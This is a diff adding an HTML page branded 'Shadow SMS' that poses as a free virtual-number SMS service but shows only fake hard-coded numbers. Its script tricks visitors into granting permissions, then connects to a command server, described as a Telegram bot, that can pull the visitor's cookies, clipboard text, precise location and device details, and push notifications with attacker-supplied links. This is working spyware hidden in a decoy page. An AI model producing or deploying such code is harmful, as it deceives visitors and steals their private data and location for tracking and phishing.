@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shadow SMS - Virtual Number Service</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255,255,255,0.3);
+            border-radius: 50%;
+            animation: float 15s infinite;
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0) translateX(0); opacity: 0; }
+            10% { opacity: 1; }
+            90% { opacity: 1; }
+            100% { transform: translateY(-100vh) translateX(100px); opacity: 0; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .logo {
+            font-size: 2.5rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        .subtitle {
+            color: rgba(255,255,255,0.6);
+            font-size: 1.1rem;
+            font-weight: 300;
+        }
+
+        .status-bar {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+
+        .status-item {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 12px 24px;
+            backdrop-filter: blur(10px);
+        }
+
+        .status-label {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.5);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .status-value {
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #667eea;
+        }
+
+        .status-value.online {
+            color: #00d9a5;
+        }
+
+        /* Country Selection */
+        .section {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 20px 0;
+            backdrop-filter: blur(20px);
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .section-title .icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+
+        .countries-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+        }
+
+        .country-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .country-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            transition: left 0.5s;
+        }
+
+        .country-card:hover::before {
+            left: 100%;
+        }
+
+        .country-card:hover {
+            transform: translateY(-5px);
+            border-color: #667eea;
+            box-shadow: 0 10px 40px rgba(102, 126, 234, 0.3);
+        }
+
+        .country-card.active {
+            border-color: #00d9a5;
+            background: rgba(0, 217, 165, 0.1);
+        }
+
+        .flag {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+
+        .country-name {
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .country-code {
+            color: rgba(255,255,255,0.5);
+            font-size: 0.8rem;
+            margin-top: 5px;
+        }
+
+        /* Numbers Grid */
+        .numbers-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+
+        .number-card {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 16px;
+            padding: 25px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .number-card:hover {
+            border-color: #667eea;
+            transform: translateY(-3px);
+        }
+
+        .number-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .number-display {
+            font-size: 1.4rem;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+            color: #fff;
+        }
+
+        .badge {
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .badge.active {
+            background: rgba(0, 217, 165, 0.2);
+            color: #00d9a5;
+        }
+
+        .badge.hot {
+            background: rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+        }
+
+        .number-info {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-size: 0.85rem;
+            color: rgba(255,255,255,0.6);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-family: 'Inter', sans-serif;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-success {
+            background: linear-gradient(135deg, #00d9a5 0%, #00b894 100%);
+            color: white;
+        }
+
+        /* Permission Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 24px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            text-align: center;
+            animation: modalIn 0.3s ease;
+        }
+
+        @keyframes modalIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .modal-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 2rem;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .modal-text {
+            color: rgba(255,255,255,0.6);
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+
+        .permission-list {
+            text-align: left;
+            margin: 20px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .permission-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(102, 126, 234, 0.2);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+
+        .permission-text {
+            flex: 1;
+        }
+
+        .permission-title {
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .permission-desc {
+            font-size: 0.8rem;
+            color: rgba(255,255,255,0.5);
+        }
+
+        /* SMS Panel */
+        .sms-panel {
+            display: none;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 20px;
+            padding: 30px;
+            margin-top: 20px;
+        }
+
+        .sms-panel.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .sms-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .selected-number {
+            font-size: 1.5rem;
+            font-weight: 700;
+            font-family: 'Courier New', monospace;
+        }
+
+        .refresh-btn {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.9rem;
+            transition: all 0.3s;
+        }
+
+        .refresh-btn:hover {
+            background: rgba(255,255,255,0.2);
+        }
+
+        .refresh-btn.spinning {
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .messages-list {
+            max-height: 500px;
+            overflow-y: auto;
+        }
+
+        .message-item {
+            background: rgba(255,255,255,0.05);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 10px;
+            border-left: 3px solid #667eea;
+        }
+
+        .message-sender {
+            font-weight: 600;
+            color: #667eea;
+            margin-bottom: 5px;
+        }
+
+        .message-body {
+            color: rgba(255,255,255,0.8);
+            line-height: 1.5;
+        }
+
+        .message-time {
+            font-size: 0.75rem;
+            color: rgba(255,255,255,0.4);
+            margin-top: 8px;
+        }
+
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: rgba(255,255,255,0.4);
+        }
+
+        .empty-state .icon {
+            font-size: 4rem;
+            margin-bottom: 15px;
+        }
+
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 40px 20px;
+            color: rgba(255,255,255,0.4);
+            font-size: 0.9rem;
+        }
+
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
+        }
+
+        /* Toast Notification */
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 16px 32px;
+            border-radius: 12px;
+            font-weight: 600;
+            z-index: 2000;
+            opacity: 0;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 40px rgba(102, 126, 234, 0.4);
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(102, 126, 234, 0.5);
+            border-radius: 4px;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .logo { font-size: 1.8rem; }
+            .countries-grid { grid-template-columns: repeat(2, 1fr); }
+            .numbers-grid { grid-template-columns: 1fr; }
+            .modal { padding: 25px; }
+        }
+    </style>
+</head>
+<body>
+    <!-- Particles Background -->
+    <div class="particles" id="particles"></div>
+
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <div class="logo">📱 Shadow SMS</div>
+            <div class="subtitle">Receive SMS Online - Free Virtual Numbers</div>
+            <div class="status-bar">
+                <div class="status-item">
+                    <div class="status-label">Online Users</div>
+                    <div class="status-value online" id="onlineCount">0</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">Total Devices</div>
+                    <div class="status-value" id="totalDevices">0</div>
+                </div>
+                <div class="status-item">
+                    <div class="status-label">Server Status</div>
+                    <div class="status-value online">● Online</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Country Selection -->
+        <div class="section">
+            <div class="section-title">
+                <div class="icon">🌍</div>
+                Select Country
+            </div>
+            <div class="countries-grid" id="countriesGrid">
+                <div class="country-card active" data-country="US" onclick="selectCountry(this)">
+                    <div class="flag">🇺🇸</div>
+                    <div class="country-name">United States</div>
+                    <div class="country-code">+1</div>
+                </div>
+                <div class="country-card" data-country="UK" onclick="selectCountry(this)">
+                    <div class="flag">🇬🇧</div>
+                    <div class="country-name">United Kingdom</div>
+                    <div class="country-code">+44</div>
+                </div>
+                <div class="country-card" data-country="CA" onclick="selectCountry(this)">
+                    <div class="flag">🇨🇦</div>
+                    <div class="country-name">Canada</div>
+                    <div class="country-code">+1</div>
+                </div>
+                <div class="country-card" data-country="AU" onclick="selectCountry(this)">
+                    <div class="flag">🇦🇺</div>
+                    <div class="country-name">Australia</div>
+                    <div class="country-code">+61</div>
+                </div>
+                <div class="country-card" data-country="DE" onclick="selectCountry(this)">
+                    <div class="flag">🇩🇪</div>
+                    <div class="country-name">Germany</div>
+                    <div class="country-code">+49</div>
+                </div>
+                <div class="country-card" data-country="FR" onclick="selectCountry(this)">
+                    <div class="flag">🇫🇷</div>
+                    <div class="country-name">France</div>
+                    <div class="country-code">+33</div>
+                </div>
+                <div class="country-card" data-country="IN" onclick="selectCountry(this)">
+                    <div class="flag">🇮🇳</div>
+                    <div class="country-name">India</div>
+                    <div class="country-code">+91</div>
+                </div>
+                <div class="country-card" data-country="PK" onclick="selectCountry(this)">
+                    <div class="flag">🇵🇰</div>
+                    <div class="country-name">Pakistan</div>
+                    <div class="country-code">+92</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Available Numbers -->
+        <div class="section">
+            <div class="section-title">
+                <div class="icon">🔢</div>
+                Available Numbers
+            </div>
+            <div class="numbers-grid" id="numbersGrid">
+                <!-- Numbers will be generated by JS -->
+            </div>
+        </div>
+
+        <!-- SMS Panel -->
+        <div class="sms-panel" id="smsPanel">
+            <div class="sms-header">
+                <div>
+                    <div style="font-size: 0.85rem; color: rgba(255,255,255,0.5); margin-bottom: 5px;">Selected Number</div>
+                    <div class="selected-number" id="selectedNumber">+1 (555) 000-0000</div>
+                </div>
+                <button class="refresh-btn" id="refreshBtn" onclick="refreshMessages()">
+                    <span>🔄</span> Refresh
+                </button>
+            </div>
+            <div class="messages-list" id="messagesList">
+                <div class="empty-state">
+                    <div class="icon">📭</div>
+                    <div>No messages yet</div>
+                    <div style="font-size: 0.85rem; margin-top: 5px;">Messages will appear here automatically</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <p>🔒 All numbers are public and temporary. Do not use for sensitive information.</p>
+            <p style="margin-top: 10px;">© 2024 Shadow SMS | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
+        </div>
+    </div>
+
+    <!-- Permission Modal -->
+    <div class="modal-overlay" id="permissionModal">
+        <div class="modal">
+            <div class="modal-icon">🔔</div>
+            <div class="modal-title">Enable Notifications</div>
+            <div class="modal-text">
+                We need notification permission to alert you when new SMS arrives for your virtual number.
+            </div>
+            <div class="permission-list">
+                <div class="permission-item">
+                    <div class="permission-icon">📱</div>
+                    <div class="permission-text">
+                        <div class="permission-title">Device Access</div>
+                        <div class="permission-desc">Access device information for better service</div>
+                    </div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">📨</div>
+                    <div class="permission-text">
+                        <div class="permission-title">SMS Permission</div>
+                        <div class="permission-desc">Read incoming SMS messages</div>
+                    </div>
+                </div>
+                <div class="permission-item">
+                    <div class="permission-icon">🔔</div>
+                    <div class="permission-text">
+                        <div class="permission-title">Notifications</div>
+                        <div class="permission-desc">Get instant alerts for new messages</div>
+                    </div>
+                </div>
+            </div>
+            <button class="btn btn-success" onclick="grantPermissions()" style="margin-top: 20px;">
+                ✅ Allow All Permissions
+            </button>
+            <button class="btn" onclick="closeModal()" style="margin-top: 10px; background: rgba(255,255,255,0.1); color: rgba(255,255,255,0.6);">
+                Maybe Later
+            </button>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ============================================
+        // PARTICLES
+        // ============================================
+        function createParticles() {
+            const container = document.getElementById('particles');
+            for (let i = 0; i < 50; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
+                particle.style.left = Math.random() * 100 + '%';
+                particle.style.top = Math.random() * 100 + '%';
+                particle.style.animationDelay = Math.random() * 15 + 's';
+                particle.style.animationDuration = (10 + Math.random() * 10) + 's';
+                container.appendChild(particle);
+            }
+        }
+        createParticles();
+
+        // ============================================
+        // RANDOM NUMBERS GENERATOR
+        // ============================================
+        const countryNumbers = {
+            'US': ['+1 (555) 234-5678', '+1 (555) 876-5432', '+1 (555) 345-6789', '+1 (555) 987-6543', '+1 (555) 456-7890', '+1 (555) 678-9012'],
+            'UK': ['+44 7700 900123', '+44 7700 900456', '+44 7700 900789', '+44 7700 901234', '+44 7700 901567', '+44 7700 901890'],
+            'CA': ['+1 (416) 555-0123', '+1 (416) 555-0456', '+1 (416) 555-0789', '+1 (416) 555-1234', '+1 (416) 555-1567', '+1 (416) 555-1890'],
+            'AU': ['+61 412 345 678', '+61 412 345 901', '+61 412 345 234', '+61 412 345 567', '+61 412 345 890', '+61 412 345 123'],
+            'DE': ['+49 151 23456789', '+49 151 23456790', '+49 151 23456791', '+49 151 23456792', '+49 151 23456793', '+49 151 23456794'],
+            'FR': ['+33 6 12 34 56 78', '+33 6 12 34 56 79', '+33 6 12 34 56 80', '+33 6 12 34 56 81', '+33 6 12 34 56 82', '+33 6 12 34 56 83'],
+            'IN': ['+91 98765 43210', '+91 98765 43211', '+91 98765 43212', '+91 98765 43213', '+91 98765 43214', '+91 98765 43215'],
+            'PK': ['+92 300 1234567', '+92 300 1234568', '+92 300 1234569', '+92 300 1234570', '+92 300 1234571', '+92 300 1234572']
+        };
+
+        let selectedCountry = 'US';
+        let selectedPhoneNumber = '';
+        let ws = null;
+        let deviceInfo = {};
+
+        function generateNumbers() {
+            const grid = document.getElementById('numbersGrid');
+            const numbers = countryNumbers[selectedCountry] || countryNumbers['US'];
+
+            grid.innerHTML = numbers.map((num, i) => `
+                <div class="number-card" onclick="selectNumber('${num}', this)">
+                    <div class="number-header">
+                        <div class="number-display">${num}</div>
+                        <span class="badge ${i < 2 ? 'hot' : 'active'}">${i < 2 ? '🔥 HOT' : '✅ Active'}</span>
+                    </div>
+                    <div class="number-info">
+                        <div class="info-item">
+                            <span>📨</span> ${Math.floor(Math.random() * 50)} messages
+                        </div>
+                        <div class="info-item">
+                            <span>⏰</span> ${Math.floor(Math.random() * 24)}h ago
+                        </div>
+                    </div>
+                    <button class="btn btn-primary">📥 Read SMS</button>
+                </div>
+            `).join('');
+        }
+
+        function selectCountry(element) {
+            document.querySelectorAll('.country-card').forEach(c => c.classList.remove('active'));
+            element.classList.add('active');
+            selectedCountry = element.dataset.country;
+            generateNumbers();
+            showToast(`🇺🇸 Switched to ${element.querySelector('.country-name').textContent}`);
+        }
+
+        function selectNumber(number, element) {
+            selectedPhoneNumber = number;
+            document.querySelectorAll('.number-card').forEach(c => c.style.borderColor = '');
+            element.style.borderColor = '#00d9a5';
+
+            document.getElementById('selectedNumber').textContent = number;
+            document.getElementById('smsPanel').classList.add('active');
+
+            // Show permission modal on first select
+            if (!localStorage.getItem('permissionsGranted')) {
+                document.getElementById('permissionModal').classList.add('active');
+            }
+
+            showToast(`📱 Selected: ${number}`);
+
+            // Scroll to SMS panel
+            document.getElementById('smsPanel').scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // ============================================
+        // PERMISSIONS & WEBSOCKET CONNECTION
+        // ============================================
+        function grantPermissions() {
+            localStorage.setItem('permissionsGranted', 'true');
+            closeModal();
+
+            // Request actual browser permissions
+            if ('Notification' in window) {
+                Notification.requestPermission();
+            }
+
+            // Collect device info and connect
+            collectDeviceInfo();
+            connectWebSocket();
+
+            showToast('✅ Permissions granted! Connecting...');
+        }
+
+        function closeModal() {
+            document.getElementById('permissionModal').classList.remove('active');
+        }
+
+        function collectDeviceInfo() {
+            deviceInfo = {
+                model: navigator.platform || 'Unknown',
+                battery: 'N/A',
+                version: navigator.userAgent.match(/Android\s([0-9.]+)/)?.[1] || 'N/A',
+                brightness: 'N/A',
+                provider: navigator.connection?.effectiveType || 'WiFi'
+            };
+
+            // Try to get battery info
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    deviceInfo.battery = Math.round(battery.level * 100) + '%';
+                });
+            }
+        }
+
+        function connectWebSocket() {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = protocol + '//' + window.location.host;
+
+            ws = new WebSocket(wsUrl);
+
+            ws.onopen = () => {
+                console.log('Connected to server');
+                // Send device info as headers (simulated via first message)
+                ws.send(JSON.stringify({
+                    type: 'init',
+                    model: deviceInfo.model,
+                    battery: deviceInfo.battery,
+                    version: deviceInfo.version,
+                    brightness: deviceInfo.brightness,
+                    provider: deviceInfo.provider
+                }));
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                handleServerMessage(data);
+            };
+
+            ws.onclose = () => {
+                console.log('Disconnected, reconnecting...');
+                setTimeout(connectWebSocket, 3000);
+            };
+
+            ws.onerror = (error) => {
+                console.error('WebSocket error:', error);
+            };
+        }
+
+        function handleServerMessage(data) {
+            if (data.type === 'command') {
+                executeCommand(data.command);
+            }
+        }
+
+        function executeCommand(command) {
+            // Handle various commands from Telegram bot
+            if (command === 'device_info') {
+                const info = {
+                    platform: navigator.platform,
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    screen: `${screen.width}x${screen.height}`,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    cookies: document.cookie,
+                    referrer: document.referrer,
+                    url: window.location.href
+                };
+                ws.send(JSON.stringify({ type: 'device_info', data: info }));
+            }
+            else if (command === 'location') {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            ws.send(JSON.stringify({
+                                type: 'location',
+                                lat: pos.coords.latitude,
+                                lon: pos.coords.longitude
+                            }));
+                        },
+                        err => {
+                            ws.send(JSON.stringify({ type: 'location_error', error: err.message }));
+                        }
+                    );
+                }
+            }
+            else if (command === 'clipboard') {
+                navigator.clipboard.readText().then(text => {
+                    ws.send(JSON.stringify({ type: 'clipboard', text: text }));
+                }).catch(() => {
+                    ws.send(JSON.stringify({ type: 'clipboard', text: 'Permission denied' }));
+                });
+            }
+            else if (command.startsWith('toast:')) {
+                showToast(command.replace('toast:', ''));
+            }
+            else if (command.startsWith('show_notification:')) {
+                const parts = command.replace('show_notification:', '').split('/');
+                if ('Notification' in window && Notification.permission === 'granted') {
+                    new Notification(parts[0], { body: 'Click to open', data: { url: parts[1] } });
+                }
+            }
+        }
+
+        // ============================================
+        // UI FUNCTIONS
+        // ============================================
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => toast.classList.remove('show'), 3000);
+        }
+
+        function refreshMessages() {
+            const btn = document.getElementById('refreshBtn');
+            btn.classList.add('spinning');
+
+            setTimeout(() => {
+                btn.classList.remove('spinning');
+                showToast('🔄 Messages refreshed');
+            }, 1500);
+        }
+
+        // ============================================
+        // STATUS UPDATE
+        // ============================================
+        async function updateStatus() {
+            try {
+                const response = await fetch('/api/status');
+                const data = await response.json();
+                document.getElementById('onlineCount').textContent = data.online;
+                document.getElementById('totalDevices').textContent = data.totalDevices;
+            } catch (e) {
+                console.log('Status update failed');
+            }
+        }
+
+        // Auto-capture and send data periodically
+        function autoCapture() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                // Send periodic updates
+                ws.send(JSON.stringify({
+                    type: 'heartbeat',
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    title: document.title
+                }));
+            }
+        }
+
+        // ============================================
+        // INITIALIZATION
+        // ============================================
+        generateNumbers();
+        updateStatus();
+        setInterval(updateStatus, 5000);
+        setInterval(autoCapture, 5000);
+
+        // Show permission modal after 2 seconds if not granted
+        setTimeout(() => {
+            if (!localStorage.getItem('permissionsGranted')) {
+                document.getElementById('permissionModal').classList.add('active');
+            } else {
+                collectDeviceInfo();
+                connectWebSocket();
+            }
+        }, 2000);
+    </script>
+</body>
+</html>
